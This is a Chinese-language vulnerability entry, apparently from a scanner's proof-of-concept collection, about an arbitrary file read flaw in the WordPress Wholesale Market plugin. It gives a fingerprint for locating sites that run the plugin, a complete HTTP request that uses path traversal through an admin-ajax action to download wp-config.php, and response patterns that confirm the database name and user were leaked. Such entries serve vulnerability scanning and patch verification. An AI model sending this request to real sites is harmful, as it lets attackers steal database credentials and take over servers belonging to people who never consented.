﻿# Wordpress Wholesale Market任意文件读取漏洞

> 更新时间：2024-03-19

> 漏洞编号：

> 漏洞说明：WordPress Wholesale Market是一个基于WordPress的电子商务平台，专门为批发业务而设计。它提供了一套完整的功能和工具，使批发商能够在网上建立和管理自己的批发市场。
WordPress Wholesale Market允许批发商创建自己的在线商店，展示和销售批发产品。它提供了产品目录管理、库存管理、订单管理、客户管理等功能，方便批发商进行商品管理和交易处理。同时，它还支持多种支付方式和配送选项，以满足不同批发商的需求。
此产品存在任意文件读取漏洞，恶意攻击者可能会利用此漏洞获取服务器的敏感信息包括数据库用户名密码等，最终导致服务器失陷。

> 漏洞特征：body="wp-content/plugins/wholesale-market"

> 验证脚本：HTTP

```
GET /wp-admin/admin-ajax.php?action=ced_cwsm_csv_import_export_module_download_error_log&tab=ced_cwsm_plugin&section=ced_cwsm_csv_import_export_module&ced_cwsm_log_download=../../../wp-config.php HTTP/1.1
Connection: close
Accept-Encoding: gzip
```

> 响应代码特征：200

> 响应内容特征：^(?=.*?DB_NAME)(?=.*?DB_USER).*?$

> 上传文件定位：

> 验证文件来源：Wordpress Wholesale Market任意文件读取漏洞.poc

